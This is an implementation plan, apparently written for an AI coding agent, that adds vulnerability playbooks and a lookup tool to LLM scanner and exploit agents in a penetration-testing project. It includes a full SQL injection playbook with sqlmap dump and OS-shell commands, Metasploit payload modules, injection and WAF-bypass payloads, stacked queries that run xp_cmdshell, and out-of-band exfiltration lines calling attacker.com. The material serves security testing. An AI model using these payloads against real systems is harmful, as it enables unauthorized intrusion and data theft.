# Vulnerability Playbooks Implementation Plan

> **For Claude:** REQUIRED SUB-SKILL: Use superpowers:executing-plans to implement this plan task-by-task.

**Goal:** Add detailed vulnerability playbooks to Scanner and Exploit agents with on-demand lookup via `get_playbook` tool.

**Architecture:** Playbooks are markdown files embedded at compile time. Scanner/Exploit agents get a summary index in their prompts and can call `get_playbook(category)` to fetch full details. The tool is handled in each agent's execute loop.

**Tech Stack:** Rust, TOML prompts, Markdown playbooks, Docker

---

## Task 1: Create Playbook Directory Structure

**Files:**
- Create: `feroxmute-core/playbooks/` directory
- Create: `feroxmute-core/playbooks/.gitkeep`

**Step 1: Create directory**

```bash
mkdir -p feroxmute-core/playbooks
```

**Step 2: Add gitkeep**

```bash
touch feroxmute-core/playbooks/.gitkeep
```

**Step 3: Commit**

```bash
git add feroxmute-core/playbooks/.gitkeep
git commit -m "chore: create playbooks directory structure"
```

---

## Task 2: Implement Playbook Module

**Files:**
- Create: `feroxmute-core/src/tools/playbook.rs`
- Modify: `feroxmute-core/src/tools/mod.rs`

**Step 1: Create playbook.rs with embedded content**

Create `feroxmute-core/src/tools/playbook.rs`:

```rust
//! Vulnerability playbook lookup
//!
//! Provides embedded playbooks for vulnerability testing techniques.

use std::collections::HashMap;
use std::sync::LazyLock;

/// All available playbook categories
pub const PLAYBOOK_CATEGORIES: &[&str] = &[
    "sql-injection",
    "xss",
    "csrf",
    "command-injection",
    "jwt-attacks",
    "xxe",
    "lfi-rfi",
    "ssti",
    "ssrf",
    "deserialization",
    "race-conditions",
    "nosql-injection",
    "graphql",
    "websockets",
    "windows-web",
    "windows-ad",
    "crypto",
];

/// Embedded playbooks loaded at compile time
static PLAYBOOKS: LazyLock<HashMap<&'static str, &'static str>> = LazyLock::new(|| {
    let mut map = HashMap::new();
    map.insert("sql-injection", include_str!("../../playbooks/sql-injection.md"));
    map.insert("xss", include_str!("../../playbooks/xss.md"));
    map.insert("csrf", include_str!("../../playbooks/csrf.md"));
    map.insert("command-injection", include_str!("../../playbooks/command-injection.md"));
    map.insert("jwt-attacks", include_str!("../../playbooks/jwt-attacks.md"));
    map.insert("xxe", include_str!("../../playbooks/xxe.md"));
    map.insert("lfi-rfi", include_str!("../../playbooks/lfi-rfi.md"));
    map.insert("ssti", include_str!("../../playbooks/ssti.md"));
    map.insert("ssrf", include_str!("../../playbooks/ssrf.md"));
    map.insert("deserialization", include_str!("../../playbooks/deserialization.md"));
    map.insert("race-conditions", include_str!("../../playbooks/race-conditions.md"));
    map.insert("nosql-injection", include_str!("../../playbooks/nosql-injection.md"));
    map.insert("graphql", include_str!("../../playbooks/graphql.md"));
    map.insert("websockets", include_str!("../../playbooks/websockets.md"));
    map.insert("windows-web", include_str!("../../playbooks/windows-web.md"));
    map.insert("windows-ad", include_str!("../../playbooks/windows-ad.md"));
    map.insert("crypto", include_str!("../../playbooks/crypto.md"));
    map
});

/// Get a playbook by category name
pub fn get_playbook(category: &str) -> Option<&'static str> {
    PLAYBOOKS.get(category).copied()
}

/// List all available playbook categories
pub fn list_categories() -> &'static [&'static str] {
    PLAYBOOK_CATEGORIES
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_get_playbook_exists() {
        let playbook = get_playbook("sql-injection");
        assert!(playbook.is_some());
        assert!(playbook.unwrap().contains("SQL"));
    }

    #[test]
    fn test_get_playbook_not_found() {
        let playbook = get_playbook("nonexistent");
        assert!(playbook.is_none());
    }

    #[test]
    fn test_list_categories() {
        let categories = list_categories();
        assert_eq!(categories.len(), 17);
        assert!(categories.contains(&"sql-injection"));
        assert!(categories.contains(&"windows-ad"));
    }
}
```

**Step 2: Update mod.rs to export playbook module**

Add to `feroxmute-core/src/tools/mod.rs`:

```rust
pub mod playbook;

pub use playbook::{get_playbook, list_categories, PLAYBOOK_CATEGORIES};
```

**Step 3: Verify it compiles (will fail until playbooks exist)**

```bash
cargo check -p feroxmute-core
```

Expected: Compilation error about missing playbook files (this is expected - we'll create them next)

---

## Task 3: Create Placeholder Playbooks

Create minimal placeholder files so the code compiles. These will be replaced with full content.

**Files:**
- Create: All 17 playbook files in `feroxmute-core/playbooks/`

**Step 1: Create all placeholder playbooks**

Run this script to create all placeholders:

```bash
for name in sql-injection xss csrf command-injection jwt-attacks xxe lfi-rfi ssti ssrf deserialization race-conditions nosql-injection graphql websockets windows-web windows-ad crypto; do
  echo "# ${name} Playbook

## Indicators
- TODO

## Tools
- TODO

## Techniques
- TODO
" > "feroxmute-core/playbooks/${name}.md"
done
```

**Step 2: Verify compilation succeeds**

```bash
cargo check -p feroxmute-core
```

Expected: Success

**Step 3: Run tests**

```bash
cargo test -p feroxmute-core playbook
```

Expected: All tests pass

**Step 4: Commit**

```bash
git add feroxmute-core/playbooks/*.md feroxmute-core/src/tools/playbook.rs feroxmute-core/src/tools/mod.rs
git commit -m "feat(tools): add playbook module with placeholder content"
```

---

## Task 4: Add get_playbook Tool to Scanner Agent

**Files:**
- Modify: `feroxmute-core/src/agents/scanner.rs`

**Step 1: Add tool definition to build_tools()**

Add to the `build_tools()` method in `feroxmute-core/src/agents/scanner.rs`:

```rust
ToolDefinition {
    name: "get_playbook".to_string(),
    description: "Retrieve detailed vulnerability testing playbook for a specific category. Returns techniques, tools, payloads, and bypass methods.".to_string(),
    parameters: json!({
        "type": "object",
        "properties": {
            "category": {
                "type": "string",
                "description": "Vulnerability category: sql-injection, xss, csrf, command-injection, jwt-attacks, xxe, lfi-rfi, ssti, ssrf, deserialization, race-conditions, nosql-injection, graphql, websockets, windows-web, windows-ad, crypto"
            }
        },
        "required": ["category"]
    }),
},
```

**Step 2: Add import for playbook module**

Add to imports at top of `feroxmute-core/src/agents/scanner.rs`:

```rust
use crate::tools::playbook;
```

**Step 3: Handle get_playbook in execute loop**

In the `execute()` method, find the tool handling section (around line 257 where `report_vulnerability` is handled). Add a new case before the else block that executes tools:

```rust
} else if tool_call.name == "get_playbook" {
    let category = args
        .get("category")
        .and_then(|v| v.as_str())
        .unwrap_or("");

    let playbook_content = match playbook::get_playbook(category) {
        Some(content) => content.to_string(),
        None => format!(
            "Unknown playbook category '{}'. Available: {}",
            category,
            playbook::PLAYBOOK_CATEGORIES.join(", ")
        ),
    };

    messages.push(Message::assistant(format!(
        "Playbook for '{}':\n{}",
        category, playbook_content
    )));
    result.push_str(&format!("\n## Playbook: {}\n{}\n", category, playbook_content));
} else {
```

**Step 4: Run tests**

```bash
cargo test -p feroxmute-core scanner
```

Expected: All tests pass

**Step 5: Commit**

```bash
git add feroxmute-core/src/agents/scanner.rs
git commit -m "feat(scanner): add get_playbook tool support"
```

---

## Task 5: Update Scanner Prompt with Playbook Index

**Files:**
- Modify: `feroxmute-core/prompts.toml`

**Step 1: Add playbook index section to scanner prompt**

Add this section at the end of the `[scanner]` prompt (before the closing `"""`):

```toml
## Vulnerability Playbooks

Call `get_playbook(category)` for detailed testing techniques. Quick reference:

| Category | Indicators | Primary Tools |
|----------|-----------|---------------|
| sql-injection | Error messages, numeric params, login forms | sqlmap, manual UNION/blind |
| xss | Reflected input, innerHTML, document.write | dalfox, manual |
| csrf | State-changing POST, no token validation | manual |
| command-injection | Shell chars in params, ping/curl delays | commix, manual |
| jwt-attacks | Bearer tokens, alg header, weak secrets | jwt_tool, hashcat |
| xxe | XML upload, SOAP, Office files, SVG | manual |
| lfi-rfi | File params, path=, include=, lang= | manual, ffuf |
| ssti | Template syntax in output, {{7*7}}=49 | tplmap, manual |
| ssrf | URL params, webhooks, image fetch | manual |
| deserialization | Serialized objects, magic bytes | ysoserial, manual |
| race-conditions | Concurrent requests, TOCTOU, limits | python threading |
| nosql-injection | MongoDB queries, $where, $regex | nosqlmap, manual |
| graphql | Introspection, batching, nested queries | manual |
| websockets | WS connections, no origin check | wscat, manual |
| windows-web | IIS, NTLM prompts, UNC paths | responder, ntlmrelayx |
| windows-ad | Domain joined, SPNs, Kerberos | impacket, crackmapexec, msf |
| crypto | Weak hashing, padding, key reuse | hashcat, john, manual |

**Workflow:** When you identify potential vulnerability indicators, fetch the relevant playbook before testing.
```

**Step 2: Verify prompts parse correctly**

```bash
cargo test -p feroxmute-core prompts
```

Expected: All tests pass

**Step 3: Commit**

```bash
git add feroxmute-core/prompts.toml
git commit -m "feat(prompts): add playbook index to scanner prompt"
```

---

## Task 6: Create Exploit Agent (if not exists) or Update

**Files:**
- Check if `feroxmute-core/src/agents/exploit.rs` exists
- If not, the exploit functionality uses scanner agent or orchestrator spawns it differently

After checking the codebase, the exploit agent prompt exists in prompts.toml but there's no dedicated exploit.rs agent file. The orchestrator can spawn agents by type, and the exploit prompt is used when type="exploit" is passed to spawn_agent.

For now, we'll add playbook support to scanner only. The exploit playbooks will be available when/if a dedicated exploit agent is created. The scanner agent handles initial vulnerability detection; the exploit prompt in prompts.toml already covers verification.

**Step 1: Update exploit prompt with playbook reference**

Add this section to the `[exploit]` prompt in `feroxmute-core/prompts.toml`:

```toml
## Vulnerability Playbooks

If detailed testing techniques are needed, the scanner agent can fetch playbooks. Key categories for exploitation:

- **deserialization**: Gadget chains for Java, PHP, Python, .NET
- **windows-ad**: Kerberoasting, Pass-the-Hash, DCSync, Meterpreter
- **crypto**: Padding oracle, weak hashing exploitation
- **command-injection**: Reverse shell payloads, out-of-band exfiltration
```

**Step 2: Commit**

```bash
git add feroxmute-core/prompts.toml
git commit -m "feat(prompts): add playbook reference to exploit prompt"
```

---

## Task 7: Write SQL Injection Playbook

**Files:**
- Modify: `feroxmute-core/playbooks/sql-injection.md`

**Step 1: Write full playbook content**

Replace `feroxmute-core/playbooks/sql-injection.md` with:

```markdown
# SQL Injection Playbook

## Indicators

Signs this vulnerability may be present:
- Error messages containing SQL syntax (MySQL, PostgreSQL, MSSQL, Oracle, SQLite)
- Numeric ID parameters (`id=1`, `user=5`, `page=10`)
- Search functionality with user input
- Login forms (username/password fields)
- URL parameters that filter or sort data
- Form fields that query databases
- Different responses for `' OR 1=1--` vs `' OR 1=2--`

## Tools

### sqlmap (Primary)

```bash
# Basic detection
sqlmap -u "https://target.com/page?id=1" --batch --level=2

# With authentication
sqlmap -u "URL" --cookie="session=abc" --batch

# POST request
sqlmap -u "URL" --data="username=test&password=test" --batch

# Specific parameter
sqlmap -u "URL" -p id --batch

# Dump database
sqlmap -u "URL" -p id --dump --batch

# Get shell
sqlmap -u "URL" --os-shell --batch

# Specify database type
sqlmap -u "URL" --dbms=mysql --batch
```

### Manual Testing

```bash
# Error-based detection
curl "https://target.com/page?id=1'"
curl "https://target.com/page?id=1\""

# Boolean-based detection
curl "https://target.com/page?id=1 AND 1=1"
curl "https://target.com/page?id=1 AND 1=2"

# Time-based detection
curl "https://target.com/page?id=1; WAITFOR DELAY '0:0:5'--"  # MSSQL
curl "https://target.com/page?id=1' AND SLEEP(5)--"           # MySQL
curl "https://target.com/page?id=1'; SELECT pg_sleep(5)--"    # PostgreSQL

# Union-based (determine column count)
curl "https://target.com/page?id=1 ORDER BY 1--"
curl "https://target.com/page?id=1 ORDER BY 5--"
curl "https://target.com/page?id=1 UNION SELECT NULL,NULL,NULL--"
```

### Metasploit

```bash
# MySQL
use auxiliary/scanner/mysql/mysql_login
use auxiliary/admin/mysql/mysql_sql
use exploit/multi/mysql/mysql_udf_payload

# MSSQL
use auxiliary/scanner/mssql/mssql_login
use auxiliary/admin/mssql/mssql_exec
use exploit/windows/mssql/mssql_payload

# PostgreSQL
use auxiliary/scanner/postgres/postgres_login
use auxiliary/admin/postgres/postgres_sql
use exploit/linux/postgres/postgres_payload
```

## Techniques

### 1. Error-Based Injection

Trigger database errors to extract information:

```sql
-- MySQL
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--

-- MSSQL
' AND 1=CONVERT(int,(SELECT @@version))--

-- PostgreSQL
' AND 1=CAST((SELECT version()) AS int)--

-- Oracle
' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))--
```

### 2. Union-Based Injection

Extract data by appending UNION SELECT:

```sql
-- Find column count
ORDER BY 1--
ORDER BY 2--
...

-- Find displayable columns
UNION SELECT NULL,NULL,NULL--
UNION SELECT 'a',NULL,NULL--
UNION SELECT NULL,'a',NULL--

-- Extract data
UNION SELECT username,password,NULL FROM users--
UNION SELECT table_name,NULL,NULL FROM information_schema.tables--
```

### 3. Blind Boolean-Based

Infer data from true/false responses:

```sql
-- Check if admin exists
' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='a'--

-- Extract character by character
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>97--
```

### 4. Blind Time-Based

Use time delays when no visible difference:

```sql
-- MySQL
' AND IF(1=1,SLEEP(5),0)--
' AND IF((SELECT SUBSTRING(password,1,1) FROM users)='a',SLEEP(5),0)--

-- MSSQL
'; IF (1=1) WAITFOR DELAY '0:0:5'--

-- PostgreSQL
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
```

### 5. Out-of-Band (OOB)

Exfiltrate data via DNS/HTTP:

```sql
-- MySQL (requires FILE privilege)
SELECT LOAD_FILE(CONCAT('\\\\',version(),'.attacker.com\\a'))

-- MSSQL
EXEC master..xp_dirtree '\\attacker.com\share'

-- Oracle
SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT password FROM users WHERE rownum=1)) FROM DUAL
```

### 6. Stacked Queries

Execute multiple statements:

```sql
-- MSSQL/PostgreSQL support stacked queries
'; INSERT INTO users(username,password) VALUES('hacker','hacked')--
'; UPDATE users SET password='hacked' WHERE username='admin'--
'; EXEC xp_cmdshell('whoami')--
```

## Bypass Techniques

### WAF Evasion

```sql
-- Case variation
uNiOn SeLeCt

-- Comment injection
UN/**/ION SEL/**/ECT

-- URL encoding
%55%4e%49%4f%4e%20%53%45%4c%45%43%54

-- Double URL encoding
%2555%254e%2549%254f%254e

-- MySQL specific
/*!50000UNION*//*!50000SELECT*/

-- Whitespace alternatives
UNION%09SELECT
UNION%0ASELECT
UNION%0CSELECT

-- Null bytes
%00' UNION SELECT

-- HPP (HTTP Parameter Pollution)
?id=1&id=' UNION SELECT--
```

### Filter Bypass

```sql
-- No quotes (hex encoding)
SELECT * FROM users WHERE username=0x61646d696e

-- No spaces
SELECT/**/username/**/FROM/**/users

-- No commas
SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b

-- Blocked keywords
UNION ALL SELECT (instead of UNION SELECT)
|| (string concatenation instead of CONCAT)
```

## Success Indicators

- Database version string extracted
- Table/column names revealed
- User credentials dumped
- Ability to read arbitrary files (LOAD_FILE)
- Command execution via xp_cmdshell or UDF
- Data modification confirmed

## Common Database Fingerprints

| Database | Version Query | String Concat | Comments |
|----------|--------------|---------------|----------|
| MySQL | `@@version` | `CONCAT()` or `||` | `-- `, `#`, `/**/` |
| MSSQL | `@@version` | `+` | `-- `, `/**/` |
| PostgreSQL | `version()` | `||` | `-- `, `/**/` |
| Oracle | `banner FROM v$version` | `||` | `-- `, `/**/` |
| SQLite | `sqlite_version()` | `||` | `-- `, `/**/` |
```

**Step 2: Verify compilation**

```bash
cargo check -p feroxmute-core
```

Expected: Success

**Step 3: Commit**

```bash
git add feroxmute-core/playbooks/sql-injection.md
git commit -m "docs(playbooks): add SQL injection playbook"
```

---

## Task 8: Write XSS Playbook

**Files:**
- Modify: `feroxmute-core/playbooks/xss.md`

**Step 1: Write full playbook content**

Replace `feroxmute-core/playbooks/xss.md` with full XSS playbook covering:
- Reflected, Stored, DOM-based XSS
- dalfox tool usage
- Manual payloads for different contexts (HTML, JS, attribute, URL)
- Filter bypass techniques
- CSP bypass methods
- Cookie stealing, session hijacking PoCs

Content structure:
```markdown
# XSS Playbook

## Indicators
- User input reflected in page without encoding
- innerHTML, document.write, eval usage
- URL parameters displayed on page
- Search results showing query
- Error messages echoing input
- User profile fields rendered as HTML

## Tools

### dalfox
```bash
dalfox url "https://target.com/search?q=test" --blind your.xss.ht
dalfox file urls.txt --blind your.xss.ht
```

### Manual Testing
[Context-specific payloads]

## Techniques
1. Reflected XSS
2. Stored XSS
3. DOM-based XSS
4. mXSS (mutation XSS)

## Bypass Techniques
- HTML entity encoding bypass
- JavaScript escape sequences
- CSP bypass methods
- WAF evasion payloads

## Success Indicators
- alert()/confirm() execution
- Cookie exfiltration to attacker server
- DOM manipulation confirmed
```

**Step 2: Commit**

```bash
git add feroxmute-core/playbooks/xss.md
git commit -m "docs(playbooks): add XSS playbook"
```

---

## Tasks 9-22: Write Remaining Playbooks

Follow the same pattern for each playbook. Each should include:
- Indicators section
- Tools section with commands
- Techniques section with step-by-step
- Metasploit modules where applicable
- Bypass techniques
- Success indicators

**Playbooks to write:**
- Task 9: `csrf.md`
- Task 10: `command-injection.md`
- Task 11: `jwt-attacks.md`
- Task 12: `xxe.md`
- Task 13: `lfi-rfi.md`
- Task 14: `ssti.md`
- Task 15: `ssrf.md`
- Task 16: `deserialization.md`
- Task 17: `race-conditions.md`
- Task 18: `nosql-injection.md`
- Task 19: `graphql.md`
- Task 20: `websockets.md`
- Task 21: `windows-web.md`
- Task 22: `windows-ad.md`
- Task 23: `crypto.md`

Each task follows:
1. Write full playbook content
2. Verify compilation with `cargo check -p feroxmute-core`
3. Commit with message `docs(playbooks): add [category] playbook`

---

## Task 24: Update Dockerfile with Security Tools

**Files:**
- Modify: `docker/Dockerfile`

**Step 1: Add APT packages**

Add to the apt-get install section:

```dockerfile
RUN apt-get update && apt-get install -y \
    golang \
    git \
    curl \
    wget \
    sqlmap \
    feroxbuster \
    ffuf \
    chromium \
    python3 \
    whois \
    dnsutils \
    nmap \
    metasploit-framework \
    responder \
    hashcat \
    john \
    commix \
    && rm -rf /var/lib/apt/lists/*
```

**Step 2: Add Python packages**

Add after the existing uv pip install:

```dockerfile
RUN uv pip install --system --break-system-packages \
    impacket \
    crackmapexec \
    jwt-tool \
    tplmap \
    nosqlmap
```

**Step 3: Add Go tools**

Add after existing go install commands:

```dockerfile
RUN go install github.com/hahwul/dalfox/v2@latest
```

**Step 4: Add ysoserial**

```dockerfile
RUN mkdir -p /opt/ysoserial && \
    wget -O /opt/ysoserial/ysoserial.jar \
    https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar
```

**Step 5: Commit**

```bash
git add docker/Dockerfile
git commit -m "feat(docker): add security tools for playbook support"
```

---

## Task 25: Integration Test

**Step 1: Build the project**

```bash
cargo build
```

Expected: Success

**Step 2: Run all tests**

```bash
cargo test
```

Expected: All tests pass

**Step 3: Verify playbook lookup works**

```bash
cargo test -p feroxmute-core playbook
```

Expected: All playbook tests pass

**Step 4: Build Docker image (optional, large)**

```bash
docker compose -f docker/compose.yml build
```

Expected: Image builds successfully (will take time due to metasploit)

**Step 5: Final commit**

```bash
git add -A
git commit -m "feat: complete vulnerability playbooks implementation"
```

---

## Summary

After completing all tasks:

1. ✅ 17 vulnerability playbooks embedded in binary
2. ✅ `get_playbook` tool available to Scanner agent
3. ✅ Playbook index in Scanner/Exploit prompts
4. ✅ Docker image updated with security tools
5. ✅ All tests passing

The Scanner agent can now call `get_playbook("sql-injection")` to get detailed testing techniques, and the prompt index helps it identify which playbook to use based on observed indicators.
